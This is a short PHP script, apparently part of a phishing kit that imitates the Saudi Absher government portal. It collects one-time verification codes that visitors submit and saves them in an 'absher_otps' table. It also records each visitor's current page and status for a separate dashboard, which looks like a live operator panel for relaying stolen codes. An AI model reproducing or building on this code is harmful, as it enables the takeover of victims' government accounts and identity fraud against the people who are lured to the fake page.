<?php
session_start();

// الاتصال بقاعدة البيانات
require_once '../dashboard/init.php';

// إنشاء كائن User
$user = new User();

// التحقق من وجود user_id في الجلسة
if (!isset($_SESSION['user_id'])) {
    header("Location: ../absher.html");
    exit();
}

$user_id = $_SESSION['user_id'];

// التحقق من إرسال النموذج
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    $otp_code = isset($_POST['otp_code']) ? trim($_POST['otp_code']) : '';
    
    if (!empty($otp_code)) {
        
        // حفظ رمز OTP في جدول absher_otps
        $result = $user->insertAbsherOTP($user_id, $otp_code);
        
        if ($result) {
            
            // تحديث رسالة المستخدم
            $user->updateUserMessage($user_id, 'رمز تحقق أبشر - تم الإدخال');
            $user->updateUserCurrentPage($user_id, 'absher-success.php');
            
            // إعادة التوجيه إلى صفحة نجاح
            header("Location: ../register.php");
            exit();
            
        } else {
            echo "خطأ في حفظ رمز التحقق";
        }
        
    } else {
        echo "يرجى إدخال رمز التحقق";
    }
    
} else {
    echo "طريقة الإرسال غير صحيحة";
}
?>